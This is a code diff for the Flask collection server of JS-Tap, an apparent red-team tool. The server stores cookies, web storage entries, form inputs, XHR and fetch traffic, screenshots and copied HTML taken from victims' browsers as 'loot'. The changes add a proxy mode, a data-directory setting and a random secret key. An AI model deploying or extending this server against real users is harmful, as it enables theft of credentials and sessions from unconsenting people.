@@ -1,6 +1,7 @@
 #!usr/bin/env python
 from flask import Flask, jsonify, abort, make_response, g, request, render_template, redirect, url_for, send_from_directory
 from werkzeug.serving import WSGIRequestHandler
+from werkzeug.middleware.proxy_fix import ProxyFix
 from flask_cors import CORS
 from markupsafe import Markup, escape
 from flask_sqlalchemy import SQLAlchemy
@@ -22,16 +23,39 @@ import shutil
 
 
 
+#***************************************************************************
+# Configuration
 
+# Proxy mode
+# Handy for running nginx proxy in front
+# of JS-Tap server to handle SSL certs.
+# If set to True
+# JS-Tap will run http and rely on nginx
+# Note that nginx needs to set an X-Forwarded-For 
+# header or JS-Tap won't know the IP address of the cliet
+# -----
+# If set to False JS-Tap will use a 
+# self signed cert
+proxyMode = False
+
+
+# Data Directory
+# File path to folder where loot directory 
+# and SQLite database are saved
+dataDirectory = "./"
+
+
+
+#***************************************************************************
 # Initialization stuff
 app = Flask(__name__)
 CORS(app)
 baseDir = os.path.abspath(os.path.dirname(__file__))
-app.config["SQLALCHEMY_DATABASE_URI"] = 'sqlite:///' + os.path.join(baseDir, 'jsTap.db')
+app.config["SQLALCHEMY_DATABASE_URI"] = 'sqlite:///' + os.path.abspath(dataDirectory + 'jsTap.db')
 app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
 
-app.config['SECRET_KEY'] = 'b4CtXzlMp9tsATa3i7jgNiB10eiJbrQG'
-# app.config['SECRET_KEY'] = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=45))
+# app.config['SECRET_KEY'] = 'b4CtXzlMp9tsATa3i7jgNiB10eiJbrQG'
+app.config['SECRET_KEY'] = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=45))
 
 app.config['SESSION_COOKIE_SECURE']   = True
 app.config['SESSION_COOKIE_HTTPONLY'] = True
@@ -42,6 +66,7 @@ login_manager = LoginManager()
 login_manager.login_view = 'login'
 login_manager.init_app(app)
 bcrypt = Bcrypt(app)
+
 
 
 # *********************************************************************
@@ -412,7 +437,7 @@ class User(UserMixin, db.Model):
 def logEvent(identifier, logString):
     threadLock.acquire()
     # print("++ Start logEvent")
-    lootPath = './loot/client_' + str(SessionDirectories[identifier])
+    lootPath = dataDirectory + 'lootFiles/client_' + str(SessionDirectories[identifier])
 
     # We're going to append to the logfile
     sessionFile = open(lootPath + "/" + logFileName, "a")
@@ -596,11 +621,11 @@ def sendLootFile(path):
     # with CSS/JavaScript requests from our browser. No good. 
     if "htmlCopy.html" in path:
         # print("### We're serving up stolent HTML!")
-        return send_from_directory('loot', path, as_attachment=True)
+        return send_from_directory(dataDirectory + 'lootFiles', path, as_attachment=True)
     else:
         # Just display the screenshot in the browser, this is safe
         # print("#### Serving up screenshot!")    
-        return send_from_directory('loot', path)
+        return send_from_directory(dataDirectory + 'lootFiles', path)
 
 
 # Serve up static files
@@ -698,7 +723,7 @@ def returnUUID():
     # Initialize our storage
     SessionDirectories[token] = lootDirCounter
     lootDirCounter = lootDirCounter + 1
-    lootPath = './loot/client_' + str(SessionDirectories[token])
+    lootPath = dataDirectory + 'lootFiles/client_' + str(SessionDirectories[token])
     #print("Checking if loot dir exists: " + lootPath)
 
     if not os.path.exists(lootPath):
@@ -710,7 +735,7 @@ def returnUUID():
         sessionFile.close()
 
         # Record the client index
-        clientFile = open("./loot/clients.txt", "a")
+        clientFile = open(dataDirectory + "lootFiles/clients.txt", "a")
         clientFile.write(str(time.time()) + ", " + token + ": " + lootPath + "\n")
         clientFile.close()
     # else:
@@ -761,7 +786,7 @@ def recordScreenshot(identifier):
         quit()
 
     #print("Writing the file to disk...")
-    with open ("./loot/" + lootDir + "/" + str(imageNumber) + "_Screenshot.png", "wb") as binary_file:
+    with open (dataDirectory + "lootFiles/" + lootDir + "/" + str(imageNumber) + "_Screenshot.png", "wb") as binary_file:
         logEvent(identifier, "Screenshot: " + str(imageNumber) + "_Screenshot.png")
         binary_file.write(image)
         binary_file.close()
@@ -769,7 +794,13 @@ def recordScreenshot(identifier):
     # Put it in the DB
     newScreenshot = Screenshot(clientID=identifier, fileName="./loot/" + lootDir + "/" + str(imageNumber) + "_Screenshot.png")
     db.session.add(newScreenshot)
-    clientSeen(identifier, request.remote_addr, request.headers.get('User-Agent'))
+
+    if (proxyMode):
+        ip = request.headers.get('X-Forwarded-For')
+    else:
+        ip = request.remote_addr
+
+    clientSeen(identifier, ip, request.headers.get('User-Agent'))
     dbCommit()
 
     # add to global event table
@@ -806,7 +837,7 @@ def recordHTML(identifier):
         raise RuntimeError("Session HTML counter not found")
         quit()
 
-    lootFile = "./loot/" + lootDir + "/" + str(htmlNumber) + "_htmlCopy.html"
+    lootFile = dataDirectory + "lootFiles/" + lootDir + "/" + str(htmlNumber) + "_htmlCopy.html"
 
     with open (lootFile, "w") as html_file:
         logEvent(identifier, "HTML Copy: " + str(htmlNumber) + "_htmlCopy.html")
@@ -818,7 +849,15 @@ def recordHTML(identifier):
     newHtml = HtmlCode(clientID=identifier, url=content['url'], 
         code=content['html'], fileName = lootFile)
     db.session.add(newHtml)
-    clientSeen(identifier, request.remote_addr, request.headers.get('User-Agent'))
+
+
+    if (proxyMode):
+        ip = request.headers.get('X-Forwarded-For')
+    else:
+        ip = request.remote_addr
+
+
+    clientSeen(identifier, ip, request.headers.get('User-Agent'))
     dbCommit()
 
     # add to global event table
@@ -850,7 +889,13 @@ def recordUrl(identifier):
     # Put it in the DB
     newUrl = UrlVisited(clientID=identifier, url=content['url'])
     db.session.add(newUrl)
-    clientSeen(identifier, request.remote_addr, request.headers.get('User-Agent'))
+
+    if (proxyMode):
+        ip = request.headers.get('X-Forwarded-For')
+    else:
+        ip = request.remote_addr
+
+    clientSeen(identifier, ip, request.headers.get('User-Agent'))
     dbCommit()
 
     # add to global event table
@@ -883,7 +928,13 @@ def recordInput(identifier):
     # Put it in the DB
     newInput = UserInput(clientID=identifier, inputName=content['inputName'], inputValue=content['inputValue'])
     db.session.add(newInput)
-    clientSeen(identifier, request.remote_addr, request.headers.get('User-Agent'))
+
+    if (proxyMode):
+        ip = request.headers.get('X-Forwarded-For')
+    else:
+        ip = request.remote_addr
+
+    clientSeen(identifier, ip, request.headers.get('User-Agent'))
     dbCommit()
 
     # add to global event table
@@ -917,7 +968,13 @@ def recordCookie(identifier):
     # Put it in the DB
     newCookie = Cookie(clientID=identifier, cookieName=cookieName, cookieValue=cookieValue)
     db.session.add(newCookie)
-    clientSeen(identifier, request.remote_addr, request.headers.get('User-Agent'))
+
+    if (proxyMode):
+        ip = request.headers.get('X-Forwarded-For')
+    else:
+        ip = request.remote_addr
+
+    clientSeen(identifier, ip, request.headers.get('User-Agent'))
     dbCommit()
 
     # add to global event table
@@ -949,7 +1006,13 @@ def recordLocalStorageEntry(identifier):
     # Put it in the DB
     newLocalStorage = LocalStorage(clientID=identifier, key=localStorageKey, value=localStorageValue)
     db.session.add(newLocalStorage)
-    clientSeen(identifier, request.remote_addr, request.headers.get('User-Agent'))
+
+    if (proxyMode):
+        ip = request.headers.get('X-Forwarded-For')
+    else:
+        ip = request.remote_addr
+
+    clientSeen(identifier, ip, request.headers.get('User-Agent'))
     dbCommit()
 
     # add to global event table
@@ -979,7 +1042,13 @@ def recordSessionStorageEntry(identifier):
     # Put it in the DB
     newSessionStorage = SessionStorage(clientID=identifier, key=sessionStorageKey, value=sessionStorageValue)
     db.session.add(newSessionStorage)
-    clientSeen(identifier, request.remote_addr, request.headers.get('User-Agent'))
+
+    if (proxyMode):
+        ip = request.headers.get('X-Forwarded-For')
+    else:
+        ip = request.remote_addr
+
+    clientSeen(identifier, ip, request.headers.get('User-Agent'))
     dbCommit()
 
 
@@ -1010,7 +1079,13 @@ def recordXhrOpen(identifier):
     # Put it in the database
     newXhrOpen = XhrOpen(clientID=identifier, method=method, url=url)
     db.session.add(newXhrOpen)
-    clientSeen(identifier, request.remote_addr, request.headers.get('User-Agent'))
+
+    if (proxyMode):
+        ip = request.headers.get('X-Forwarded-For')
+    else:
+        ip = request.remote_addr
+
+    clientSeen(identifier, ip, request.headers.get('User-Agent'))
     dbCommit()
 
     # add to global event table
@@ -1039,7 +1114,13 @@ def recordXhrHeader(identifier):
     # Put it in the database
     newXhrHeader = XhrSetHeader(clientID=identifier, header=header, value=value)
     db.session.add(newXhrHeader)
-    clientSeen(identifier, request.remote_addr, request.headers.get('User-Agent'))
+
+    if (proxyMode):
+        ip = request.headers.get('X-Forwarded-For')
+    else:
+        ip = request.remote_addr
+
+    clientSeen(identifier, ip, request.headers.get('User-Agent'))
     dbCommit()
 
     # add to global event table
@@ -1068,7 +1149,13 @@ def recordXhrCall(identifier):
     # Put it in the database
     newXhrCall = XhrCall(clientID=identifier, requestBody=requestBody, responseBody=responseBody)
     db.session.add(newXhrCall)
-    clientSeen(identifier, request.remote_addr, request.headers.get('User-Agent'))
+
+    if (proxyMode):
+        ip = request.headers.get('X-Forwarded-For')
+    else:
+        ip = request.remote_addr
+
+    clientSeen(identifier, ip, request.headers.get('User-Agent'))
     dbCommit()
 
     # add to global event table
@@ -1097,7 +1184,14 @@ def recordFetchSetup(identifier):
     # Put it in the database
     newFetchSetup = FetchSetup(clientID=identifier, method=method, url=url)
     db.session.add(newFetchSetup)
-    clientSeen(identifier, request.remote_addr, request.headers.get('User-Agent'))
+
+
+    if (proxyMode):
+        ip = request.headers.get('X-Forwarded-For')
+    else:
+        ip = request.remote_addr
+
+    clientSeen(identifier, ip, request.headers.get('User-Agent'))
     dbCommit()
 
     # add to global event table
@@ -1126,7 +1220,13 @@ def recordFetchHeader(identifier):
     # Put it in the database
     newFetchHeader = FetchHeader(clientID=identifier, header=header, value=value)
     db.session.add(newFetchHeader)
-    clientSeen(identifier, request.remote_addr, request.headers.get('User-Agent'))
+
+    if (proxyMode):
+        ip = request.headers.get('X-Forwarded-For')
+    else:
+        ip = request.remote_addr
+
+    clientSeen(identifier, ip, request.headers.get('User-Agent'))
     dbCommit()
 
     # add to global event table
@@ -1154,7 +1254,14 @@ def recordFetchCall(identifier):
     # Put it in the database
     newFetchCall = FetchCall(clientID=identifier, requestBody=requestBody, responseBody=responseBody)
     db.session.add(newFetchCall)
-    clientSeen(identifier, request.remote_addr, request.headers.get('User-Agent'))
+
+
+    if (proxyMode):
+        ip = request.headers.get('X-Forwarded-For')
+    else:
+        ip = request.remote_addr
+
+    clientSeen(identifier, ip, request.headers.get('User-Agent'))
     dbCommit()
 
     # add to global event table
@@ -1456,7 +1563,7 @@ if __name__ == '__main__':
 
 
     # Check for existing database file
-    if database_exists('sqlite:///' + os.path.join(baseDir, 'jsTap.db')):
+    if database_exists('sqlite:///' + os.path.abspath(dataDirectory + 'jsTap.db')):
         with app.app_context():
             print("!! SQLite database already exists:")
             clients = Client.query.all()
@@ -1516,8 +1623,8 @@ if __name__ == '__main__':
                     dbCommit()
 
                     db.create_all()
-                    if os.path.exists("./loot"):
-                        shutil.rmtree("./loot")
+                    if os.path.exists(dataDirectory + "lootFiles"):
+                        shutil.rmtree(dataDirectory + "lootFiles")
 
                 elif val == 1:
                     print("Keeping existing client data.")
@@ -1532,8 +1639,8 @@ if __name__ == '__main__':
         with app.app_context():
             db.drop_all()
             db.create_all()
-            if os.path.exists("./loot"):
-                shutil.rmtree("./loot")
+            if os.path.exists(dataDirectory + "lootFiles"):
+                shutil.rmtree(dataDirectory + "lootFiles")
             addAdminUser()
             initApplicationDefaults()
 
@@ -1543,11 +1650,22 @@ if __name__ == '__main__':
 
 
     # Check for loot directory
-    if not os.path.exists("./loot"):
-        os.mkdir("./loot")
+    if not os.path.exists(dataDirectory + "lootFiles"):
+        os.mkdir(dataDirectory + "lootFiles")
 
     # Response configuration
     WSGIRequestHandler.protocol_version = "HTTP/1.1"
     WSGIRequestHandler.server_version   = "nginx"
     WSGIRequestHandler.sys_version      = ""
-    app.run(debug=False, host='0.0.0.0', port=8444, ssl_context='adhoc')
+
+
+    # If proxy mode we run HTTP and accept the proxy headers from nginx
+    # If not proxy mode we'll run self-signed cert for testing
+    if (proxyMode):
+        app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
+        app.run(debug=False, host='0.0.0.0', port=8444)
+    else:
+        app.run(debug=False, host='0.0.0.0', port=8444, ssl_context='adhoc')
+       
+
+
